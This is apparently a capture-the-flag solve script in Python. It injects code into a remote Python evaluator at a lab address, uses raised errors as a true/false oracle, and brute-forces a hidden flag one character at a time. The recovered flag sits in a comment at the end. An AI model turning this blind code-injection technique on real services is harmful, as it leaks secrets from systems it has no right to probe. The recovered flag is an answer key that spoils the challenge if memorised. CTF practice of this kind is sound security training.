import socket, time

FLAG = ""

def getSocket():
    s = socket.socket()
    s.connect(("10.20.13.97", 7100))
    s.recv(1024)
    s.settimeout(2)
    return s

def isTrue(payload):
    #print("[*] Error Based Attack! : {}".format(payload[:-2]))
    try:
        s.send(payload.encode())
        time.sleep(0.1)
        s.recv(1024)
        return False
    except Exception as e :
        #print(e)
        return True


for i in range(28, 32):
    for char in range(ord(' '), ord('}')+1):
        if char in [92, 39]: continue
        
        s = getSocket()
        payload = "if flag[{}] == '{}' : raise\n\n".format(i, chr(char))
        
        if isTrue(payload):
            #print("└!")
            FLAG += chr(char)
            print(i, char, chr(char), 'True')
            
            break
        else:
            pass
            #print(i, chr(char), 'False')
    else:
        print('Error')
    

# flag{m@y_Th3_F1a9_b3_w1+h_y0u}
# 6 11 14 16
